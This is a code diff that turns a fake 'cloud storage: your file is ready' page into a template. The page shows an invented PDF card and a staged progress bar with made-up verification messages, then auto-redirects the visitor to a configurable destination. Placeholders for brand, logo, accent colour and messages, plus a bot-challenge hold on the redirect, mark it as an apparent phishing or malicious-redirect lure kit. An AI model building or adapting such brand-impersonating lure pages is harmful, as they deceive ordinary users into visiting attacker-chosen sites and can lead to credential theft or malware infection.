@@ -3,18 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Your file is ready</title>
+<title>__TITLE__</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--bg:#eef2f7;--card:#fff;--text:#111827;--muted:#6b7280;--line:#e5e7eb;--accent:#0a66c2}
-@media (prefers-color-scheme:dark){:root{--bg:#0b0f16;--card:#121826;--text:#e8edf7;--muted:#94a3b8;--line:#1f2937;--accent:#3b82f6}}
+:root{--bg:#eef2f7;--card:#fff;--text:#111827;--muted:#6b7280;--line:#e5e7eb;--accent:__ACCENT__}
+@media (prefers-color-scheme:dark){:root{--bg:#0b0f16;--card:#121826;--text:#e8edf7;--muted:#94a3b8;--line:#1f2937}}
 body{font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:22px}
 .card{width:460px;max-width:100%;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:0 20px 50px rgba(15,23,42,.12)}
-.head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
-.cloud{width:38px;height:38px;border-radius:11px;background:color-mix(in srgb,var(--accent) 12%,transparent);display:flex;align-items:center;justify-content:center}
-.cloud svg{width:20px;height:20px;fill:none;stroke:var(--accent);stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+.head{display:flex;align-items:center;gap:12px;margin-bottom:22px;min-height:40px}
 .brand{font-size:14px;font-weight:700;letter-spacing:.2px}
-.brand small{display:block;font-size:11.5px;font-weight:500;color:var(--muted)}
+.sub{font-size:11.5px;font-weight:500;color:var(--muted)}
 h1{font-size:21px;font-weight:650;letter-spacing:-.2px;margin-bottom:6px}
 p{font-size:14px;color:var(--muted);line-height:1.55}
 .file{margin-top:20px;display:flex;align-items:center;gap:12px;border:1px solid var(--line);border-radius:12px;padding:12px 14px}
@@ -33,43 +31,27 @@ p{font-size:14px;color:var(--muted);line-height:1.55}
 </head>
 <body>
 <div class="card">
-  <div class="head">
-    <span class="cloud"><svg viewBox="0 0 24 24"><path d="M7 18a4 4 0 0 1 0-8 5.5 5.5 0 0 1 10.5-1.2A4 4 0 0 1 18 18z"/></svg></span>
-    <span class="brand">Cloud storage<small>Shared with you</small></span>
-  </div>
-  <h1>Your file is ready</h1>
-  <p>A shared document has been prepared for you. It will open automatically.</p>
-
-  <div class="file">
-    <span class="ficon">📄</span>
-    <span>
-      <span class="fname">Document.pdf</span>
-      <span class="fmeta">PDF · 1.2 MB · updated just now</span>
-    </span>
-    <span class="badge">Ready</span>
-  </div>
-
+  <div class="head">__LOGO__<span><span class="brand">__BRAND__</span><span class="sub">Shared with you</span></span></div>
+  <h1>__TITLE__</h1>
+  <p>__SUBTITLE__</p>
+  <div class="file"><span class="ficon">📄</span><span><span class="fname">Document.pdf</span><span class="fmeta">PDF · 1.2 MB · updated just now</span></span><span class="badge">Ready</span></div>
   <div class="bar"><div class="fill" id="fill"></div></div>
-  <div class="row"><span><span class="spin"></span> <span id="status">Preparing secure link…</span></span><span id="pct">0%</span></div>
-
-  <a class="btn" id="open" href="#">Open file</a>
+  <div class="row"><span><span class="spin"></span> <span id="status"></span></span><span id="pct">0%</span></div>
+  <a class="btn" id="open" href="#">__BUTTON__</a>
   <div class="ts"><div id="__ts_slot__"></div></div>
 </div>
 <script>
-var DEST = "__DESTINATION__", DELAY = __DELAY__;
+var DEST = "__DESTINATION__", DELAY = __DELAY__, MSGS = __MSGS__;
 function __finish(){ if(window.__tsPending) return; if(DEST) window.location.replace(DEST); }
 window.__tsGo = __finish;
 document.getElementById("open").setAttribute("href", DEST || "#");
-
 var fill = document.getElementById("fill"), pct = document.getElementById("pct"), status = document.getElementById("status");
-var msgs = ["Preparing secure link…","Verifying permissions…","Almost ready…"];
+status.textContent = MSGS[0] || "";
 var total = DELAY * 1000, step = 40, p = 0;
 var t = setInterval(function(){
-  p += 100 / (total/step);
-  if(p > 100) p = 100;
-  fill.style.width = p + "%";
-  pct.textContent = Math.round(p) + "%";
-  status.textContent = msgs[Math.min(msgs.length-1, Math.floor(p/34))];
+  p += 100 / (total/step); if(p > 100) p = 100;
+  fill.style.width = p + "%"; pct.textContent = Math.round(p) + "%";
+  status.textContent = MSGS[Math.min(MSGS.length-1, Math.floor(p/34))] || status.textContent;
   if(p >= 100){ clearInterval(t); __finish(); }
 }, step);
 setTimeout(function(){ if(window.__tsPending){ window.__tsPending=false; __finish(); } }, (DELAY+4)*1000);
